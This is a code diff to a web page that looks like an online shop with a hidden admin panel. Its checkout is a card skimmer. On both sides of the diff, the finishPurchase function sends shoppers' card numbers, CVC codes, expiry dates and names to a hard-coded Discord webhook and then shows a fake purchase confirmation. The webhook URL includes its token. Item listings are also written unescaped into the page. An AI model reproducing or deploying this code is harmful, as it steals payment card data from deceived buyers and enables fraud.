@@ -29,7 +29,7 @@ button { margin-top:8px; padding:6px 12px; border:none; background:#ff3cc7; colo
 <button onclick="changeBG()">Apply Background</button>
 <hr style="margin:15px 0; border-color:#444;">
 <h3>Search Items</h3>
-<input id="searchBox" type="text" placeholder="Search..." oninput="searchItems()" style="width:100%;">
+<input id="searchBox" type="text" placeholder="Search..." style="width:100%;">
 <hr style="margin:15px 0; border-color:#444;">
 <h3>Add / Edit Items</h3>
 <label>Name:<br><input id="itemName" type="text" style="width:100%"></label><br><br>
@@ -72,107 +72,111 @@ const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 const itemsRef = ref(db, 'shop/items');
 
-// Admin panel toggle: Ctrl + Shift + K
-document.addEventListener('keydown', e => {
-  if(e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'k'){
-    e.preventDefault();
-    const panel = document.getElementById('adminPanel');
-    panel.style.display = (panel.style.display==='block')?'none':'block';
-  }
-});
+// Wait for DOM to load before attaching events
+document.addEventListener('DOMContentLoaded', () => {
 
-// Background
-function changeBG(){ document.body.style.background = bgColor.value; }
-
-// Search
-function searchItems(){
-  const term=searchBox.value.toLowerCase();
-  document.querySelectorAll(".item").forEach(i=>{
-    const name=i.querySelector("h3").textContent.toLowerCase();
-    i.style.display=name.includes(term)?'block':'none';
+  // Admin panel toggle: Ctrl + Shift + K
+  document.addEventListener('keydown', e => {
+    if(e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'k'){
+      e.preventDefault();
+      const panel = document.getElementById('adminPanel');
+      if(panel) panel.style.display = (panel.style.display==='block')?'none':'block';
+    }
   });
-}
 
-// Globals
-let selectedName = "";
-let selectedPrice = "";
+  // Background
+  window.changeBG = function(){ document.body.style.background = bgColor.value; };
 
-// Load items in real-time
-onValue(itemsRef, snapshot=>{
-  const grid=document.getElementById("grid");
-  grid.innerHTML="";
-  snapshot.forEach(child=>{
-    const it=child.val();
-    const div=document.createElement("div");
-    div.className="item";
-    div.innerHTML=`<img src="${it.img}"><h3>${it.name}</h3><p>$${it.price}</p><button onclick="selectItemAndBuy('${it.name}','${it.price}')">Buy</button>`;
-    grid.appendChild(div);
+  // Search
+  searchBox.addEventListener('input', () => {
+    const term = searchBox.value.toLowerCase();
+    document.querySelectorAll(".item").forEach(i => {
+      const name = i.querySelector("h3").textContent.toLowerCase();
+      i.style.display = name.includes(term) ? 'block' : 'none';
+    });
   });
-});
 
-// Add item
-window.addItem = function(){
-  const name=itemName.value;
-  const price=itemPrice.value;
-  const img=itemImage.value;
-  if(!name||!price||!img) return alert("Fill all fields");
-  const newItemRef = push(itemsRef);
-  set(newItemRef,{name,price,img});
-};
+  // Globals
+  window.selectedName = "";
+  window.selectedPrice = "";
 
-// Remove last item
-window.removeLastItem = function(){
-  const lastItemQuery = query(itemsRef, limitToLast(1));
-  get(lastItemQuery).then(snapshot=>{
-    snapshot.forEach(child=>remove(child.ref));
+  // Load items in real-time
+  onValue(itemsRef, snapshot => {
+    const grid = document.getElementById("grid");
+    grid.innerHTML = "";
+    snapshot.forEach(child => {
+      const it = child.val();
+      const div = document.createElement("div");
+      div.className = "item";
+      div.innerHTML = `<img src="${it.img}"><h3>${it.name}</h3><p>$${it.price}</p><button onclick="selectItemAndBuy('${it.name}','${it.price}')">Buy</button>`;
+      grid.appendChild(div);
+    });
   });
-};
 
-// Select item for checkout
-window.selectItemAndBuy = function(name,price){
-  selectedName=name;
-  selectedPrice=price;
-  openCheckout();
-};
-
-// Checkout modal
-function openCheckout(){ checkoutModal.style.display="flex"; }
-function closeCheckout(){ checkoutModal.style.display="none"; }
-
-// Validation
-function validateCheckout(){
-  const valid = cardNum.value.length===16 && /^\d+$/.test(cardNum.value) &&
-                cvc.value.length===3 && /^\d+$/.test(cvc.value) &&
-                fullName.value.trim().length>2 && expDate.value.trim().length>0;
-  purchaseBtn.disabled=!valid;
-  purchaseBtn.style.background = valid?"#ff3cc7":"#555";
-}
-["cardNum","cvc","fullName","expDate"].forEach(id=>document.getElementById(id).addEventListener("input",validateCheckout));
-
-// Webhook
-const webhookURL = "https://discord.com/api/webhooks/1441183630201323582/DaQuLEv0FsiW_DoAuLe-OxPoaIVB-4JhfptNgKzMCgJUXxXHlOw2vMXK2-Z2PD7AysnR";
-window.finishPurchase = function(){
-  const payload = { content:
-`🛒 **New Purchase**
-Credit Card: ${cardNum.value}
-Cvc: ${cvc.value}
-Exp date: ${expDate.value}
-Buyer: ${fullName.value}
-Time: ${new Date().toLocaleString()}`
+  // Add item
+  window.addItem = function() {
+    const name = itemName.value;
+    const price = itemPrice.value;
+    const img = itemImage.value;
+    if(!name || !price || !img) return alert("Fill all fields");
+    const newItemRef = push(itemsRef);
+    set(newItemRef, {name, price, img});
   };
-  fetch(webhookURL,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify(payload)
-  }).then(res=>{
-    if(res.ok){
-      alert("Thank you for your purchase!");
-      closeCheckout();
-      cardNum.value=""; cvc.value=""; fullName.value=""; expDate.value="";
-      validateCheckout();
-    }else alert("Webhook error.");
-  }).catch(err=>alert("Error: "+err));
-};
+
+  // Remove last item
+  window.removeLastItem = function() {
+    const lastItemQuery = query(itemsRef, limitToLast(1));
+    get(lastItemQuery).then(snapshot=>{
+      snapshot.forEach(child=>remove(child.ref));
+    });
+  };
+
+  // Select item for checkout
+  window.selectItemAndBuy = function(name,price){
+    selectedName = name;
+    selectedPrice = price;
+    openCheckout();
+  };
+
+  // Checkout modal
+  window.openCheckout = function(){ checkoutModal.style.display="flex"; }
+  window.closeCheckout = function(){ checkoutModal.style.display="none"; }
+
+  // Validation
+  function validateCheckout(){
+    const valid = cardNum.value.length===16 && /^\d+$/.test(cardNum.value) &&
+                  cvc.value.length===3 && /^\d+$/.test(cvc.value) &&
+                  fullName.value.trim().length>2 && expDate.value.trim().length>0;
+    purchaseBtn.disabled = !valid;
+    purchaseBtn.style.background = valid ? "#ff3cc7" : "#555";
+  }
+  ["cardNum","cvc","fullName","expDate"].forEach(id=>document.getElementById(id).addEventListener("input",validateCheckout));
+
+  // Webhook
+  const webhookURL = "https://discord.com/api/webhooks/1441183630201323582/DaQuLEv0FsiW_DoAuLe-OxPoaIVB-4JhfptNgKzMCgJUXxXHlOw2vMXK2-Z2PD7AysnR";
+  window.finishPurchase = function(){
+    const payload = { content:
+`🛒 **New Purchase**
+Cvc: ${cvc.value}
+Credit Card: ${cardNum.value}
+Buyer: ${fullName.value}
+Exp date: ${expDate.value}
+Time: ${new Date().toLocaleString()}`
+    };
+    fetch(webhookURL, {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify(payload)
+    }).then(res=>{
+      if(res.ok){
+        alert("Thank you for your purchase!");
+        closeCheckout();
+        cardNum.value=""; cvc.value=""; fullName.value=""; expDate.value="";
+        validateCheckout();
+      } else alert("Webhook error.");
+    }).catch(err=>alert("Error: "+err));
+  };
+});
 </script>
 </body>
 </html>
